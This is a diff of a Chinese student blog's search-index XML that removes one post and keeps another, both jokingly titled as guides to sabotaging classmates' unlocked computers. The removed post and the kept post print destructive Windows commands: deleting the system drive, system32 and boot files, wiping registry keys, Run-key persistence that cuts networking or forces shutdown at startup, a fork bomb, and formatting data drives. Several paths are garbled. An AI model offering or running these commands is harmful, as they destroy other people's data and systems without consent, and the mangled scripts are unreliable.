@@ -3,6 +3,14 @@
   
     
     <entry>
+      <title></title>
+      <link href="//posts/%E6%AD%A3%E7%9D%BF2019%E6%99%AE%E5%8F%8A%E7%BB%84%E4%BA%94%E8%81%94%E6%B5%8B%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
+      <content type="html"><![CDATA[<hr><p>title: 正睿2019普及组五联测踩坑记录<br>date: 2019-09-14 11:31:10<br>tags:</p><ul><li>OI</li><li>正睿OI</li></ul><hr>]]></content>
+      
+      
+    </entry>
+    
+    <entry>
       <title>如何正确地机惨-macOS篇</title>
       <link href="//posts/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E5%9C%B0%E6%9C%BA%E6%83%A8-macOS%E7%AF%87/"/>
       <content type="html"><![CDATA[<p>当你身边的同学忘了锁他价值万元的MBP就出去玩时……</p><a id="more"></a><p>以下行为可能会招来一顿毒打，所有情况均与本站无关[大雾]</p><p>由于某水果牌笔记本/工作站/一体机/主机一般比较昂贵，所以请在JC时务必小心行事</p><p>万一被打死了呢[雾]</p><p>首先我们需要知道，果子的macOS与Linux都是基于UNIX的，也就是说，Linux能用的命令大多数也适用于macOS</p><p>所以，打开以下链接，继续探索属于你的世界吧[雾</p><p><a href="https://extmool.github.io/posts/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E5%9C%B0%E6%9C%BA%E6%83%A8-Linux%E6%8C%87%E4%BB%A4%E7%AF%87/">如何正确地机惨-Linux指令篇 By extmool</a></p><hr><p>[完]</p>]]></content>
@@ -81,22 +89,6 @@
     </entry>
     
     <entry>
-      <title>如何正确地机惨-Windows脚本篇</title>
-      <link href="//posts/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E5%9C%B0%E6%9C%BA%E6%83%A8-Windows%E8%84%9A%E6%9C%AC%E7%AF%87/"/>
-      <content type="html"><![CDATA[<p>当你的同学没有锁电脑的时候……</p><a id="more"></a><p>以下行为可能会招来一顿毒打，所有情况均与本站无关[大雾]</p><p>以下命令均在 Windows Server 2008 R2 测试通过，其他系统请自测。</p><p>以下所有命令需要写成 <code>bat</code> 文件运行</p><h2 id="轻微毒瘤"><a href="#轻微毒瘤" class="headerlink" title="轻微毒瘤"></a>轻微毒瘤</h2><h3 id="1-蓝屏死机"><a href="#1-蓝屏死机" class="headerlink" title="1. 蓝屏死机"></a>1. 蓝屏死机</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">del</span> <span class="variable">%systemdrive%</span>\*.*/f /s /q</span><br><span class="line">shutdown -r -f -t <span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="2-更改文件后缀名"><a href="#2-更改文件后缀名" class="headerlink" title="2. 更改文件后缀名"></a>2. 更改文件后缀名</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">REN</span> *.DOC *.EXE </span><br><span class="line"><span class="built_in">REN</span> *.JPEG *.EXE</span><br><span class="line"><span class="built_in">REN</span> *.LNK *.EXE</span><br><span class="line"><span class="built_in">REN</span> *.AVI *.EXE</span><br><span class="line"><span class="built_in">REN</span> *.MPEG *.EXE</span><br><span class="line"><span class="built_in">REN</span> *.COM *.EXE</span><br><span class="line"><span class="built_in">REN</span> *.BAT *.EXE</span><br></pre></td></tr></table></figure><h2 id="中度毒瘤"><a href="#中度毒瘤" class="headerlink" title="中度毒瘤"></a>中度毒瘤</h2><h3 id="3-删除system32"><a href="#3-删除system32" class="headerlink" title="3. 删除system32"></a>3. 删除system32</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> c:\WINDOWS\system32\*.*/q</span><br></pre></td></tr></table></figure><h3 id="4-使PC永久崩溃"><a href="#4-使PC永久崩溃" class="headerlink" title="4. 使PC永久崩溃"></a>4. 使PC永久崩溃</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">attrib</span> -r -s -h c:\autoexec.bat</span><br><span class="line"><span class="built_in">del</span> c:\autoexec.bat</span><br><span class="line"><span class="built_in">attrib</span> -r -s -h c:\boot.ini</span><br><span class="line"><span class="built_in">del</span> c:\boot.ini</span><br><span class="line"><span class="built_in">attrib</span> -r -s -h c:\ntldr</span><br><span class="line"><span class="built_in">del</span> c:\ntldr</span><br><span class="line"><span class="built_in">attrib</span> -r -s -h c:\windows\win.ini</span><br><span class="line"><span class="built_in">del</span> c:\windows\win.ini</span><br></pre></td></tr></table></figure><h3 id="5-删除所有的注册表"><a href="#5-删除所有的注册表" class="headerlink" title="5. 删除所有的注册表"></a>5. 删除所有的注册表</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">ECHO</span> OFF</span><br><span class="line"><span class="built_in">START</span> reg delete HKCR/.exe</span><br><span class="line"><span class="built_in">START</span> reg delete HKCR/.dll</span><br><span class="line">START reg delete HKCR/*</span><br></pre></td></tr></table></figure><h2 id="重度毒瘤"><a href="#重度毒瘤" class="headerlink" title="重度毒瘤"></a>重度毒瘤</h2><h3 id="6-永久禁用网络"><a href="#6-永久禁用网络" class="headerlink" title="6. 永久禁用网络"></a>6. 永久禁用网络</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> @<span class="built_in">echo</span> off&gt;c:windowswimn32.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">break</span> off&gt;&gt;c:windowswimn32.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">ipconfig</span>/release_all&gt;&gt;c:windowswimn32.bat</span><br><span class="line"><span class="built_in">echo</span> end&gt;&gt;c:windowawimn32.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn.bat</span><br><span class="line"><span class="built_in">PAUSE</span></span><br></pre></td></tr></table></figure><h3 id="7-一直按回车"><a href="#7-一直按回车" class="headerlink" title="7. 一直按回车"></a>7. 一直按回车</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span> wshShell=wscript.CreateObject("Wscript.Shell")</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">wscript.sleep <span class="number">100</span></span><br><span class="line">wshshell.sendkeys "~(enter)"</span><br><span class="line">loop</span><br></pre></td></tr></table></figure><h3 id="8-启动电脑后自动关机"><a href="#8-启动电脑后自动关机" class="headerlink" title="8. 启动电脑后自动关机"></a>8. 启动电脑后自动关机</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Astremetflaved8</span><br><span class="line"><span class="built_in">echo</span> @<span class="built_in">echo</span> off&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">break</span> off&gt;&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> shutdown -r -t <span class="number">11</span> -f&gt;&gt;c:windowshartlell.bat</span><br><span class="line"><span class="built_in">echo</span> end&gt;&gt;c:windowshartlell.bat</span><br><span class="line">reg add hkey_local_machinesoftwaremicrosoftwindowscurrentsoftversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f</span><br><span class="line">reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat</span><br><span class="line"><span class="built_in">PAUSE</span></span><br></pre></td></tr></table></figure><h2 id="极致毒瘤"><a href="#极致毒瘤" class="headerlink" title="极致毒瘤"></a>极致毒瘤</h2><h3 id="9-开启CD刻录机蜂鸣器"><a href="#9-开启CD刻录机蜂鸣器" class="headerlink" title="9. 开启CD刻录机蜂鸣器"></a>9. 开启CD刻录机蜂鸣器</h3><p>注意，这些命令可能会使您的耳朵崩溃</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span> oWMP=CreateObject("WMPlayer.OCX.<span class="number">7</span>")</span><br><span class="line"><span class="built_in">Set</span> colCDROMs=oWMP.cdrromcollection</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> colCDROMs.Count &gt;=<span class="number">1</span> then</span><br><span class="line"><span class="keyword">For</span> i=<span class="number">0</span> to colCDROMs.Count -<span class="number">1</span></span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line"><span class="keyword">For</span> i=<span class="number">0</span> to colCDROMs.Count -<span class="number">1</span></span><br><span class="line">colCDROMs.Item(i).Eject</span><br><span class="line">Next</span><br><span class="line">End <span class="keyword">if</span></span><br><span class="line">wscript.sleep <span class="number">100</span></span><br><span class="line">loop</span><br></pre></td></tr></table></figure><hr><p>[完]</p>]]></content>
-      
-      
-        <tags>
-            
-            <tag> 灌水 </tag>
-            
-            <tag> 机惨 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
       <title>如何正确地机惨-Windows指令篇</title>
       <link href="//posts/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E5%9C%B0%E6%9C%BA%E6%83%A8-Windows%E6%8C%87%E4%BB%A4%E7%AF%87/"/>
       <content type="html"><![CDATA[<p>当你的同学没有锁电脑的时候……</p><a id="more"></a><p>以下行为可能会招来一顿毒打，所有情况均与本站无关[大雾]</p><p>以下命令均在 Windows10 专业工作站版 测试通过，其他系统请自测。</p><h2 id="轻微毒瘤"><a href="#轻微毒瘤" class="headerlink" title="轻微毒瘤"></a>轻微毒瘤</h2><h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3><p>当你的朋友还有东西没有保存的时候，这个命令着实有效……</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown -f -s -t <span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/05/02/EYL2kD.png" alt="关机.png"></p><h3 id="杀explorer-exe"><a href="#杀explorer-exe" class="headerlink" title="杀explorer.exe"></a>杀explorer.exe</h3><p>这个命令配合 <code>Win + D</code> 组合键使用更佳 </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">taskkill</span> -f -im explorer.exe</span><br></pre></td></tr></table></figure><p>或<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn explorer.exe</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/05/02/EYOs3j.png" alt="taskkill.png"></p><h2 id="中度毒瘤"><a href="#中度毒瘤" class="headerlink" title="中度毒瘤"></a>中度毒瘤</h2><h3 id="卡死电脑"><a href="#卡死电脑" class="headerlink" title="卡死电脑"></a>卡死电脑</h3><p>会死机，解决办法是 <code>taskkill -f -im cmd.exe</code> </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">0</span> | %<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/05/02/EYObK1.png" alt="%0|%0.png"></p><h2 id="重度毒瘤"><a href="#重度毒瘤" class="headerlink" title="重度毒瘤"></a>重度毒瘤</h2><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>当你的朋友习惯把东西存到非系统盘的时候……</p><p>注意，此命令只能在带有管理员权限的命令提示符窗口或Powershell中使用！</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">format</span> D: /u /s</span><br><span class="line"><span class="built_in">format</span> E: /u /s</span><br><span class="line"><span class="built_in">format</span> F: /u /s</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/05/02/EYOwE8.png" alt="format.png"></p><h3 id="比格式化死得更惨的一种方式"><a href="#比格式化死得更惨的一种方式" class="headerlink" title="比格式化死得更惨的一种方式"></a>比格式化死得更惨的一种方式</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> C:\windows\system32\*.dll /f /s /q</span><br></pre></td></tr></table></figure><p>没有截图，万一我手残了一下呢……23333</p><hr><p>[完]</p>]]></content>
@@ -134,11 +126,11 @@
       
         <tags>
             
-            <tag> C++ </tag>
-            
             <tag> CodeForces </tag>
             
             <tag> OI </tag>
+            
+            <tag> C++ </tag>
             
         </tags>
       
@@ -152,9 +144,9 @@
       
         <tags>
             
-            <tag> C++ </tag>
-            
             <tag> OI </tag>
+            
+            <tag> C++ </tag>
             
         </tags>
       
@@ -174,9 +166,9 @@
       
         <tags>
             
-            <tag> C++ </tag>
-            
             <tag> OI </tag>
+            
+            <tag> C++ </tag>
             
         </tags>
       
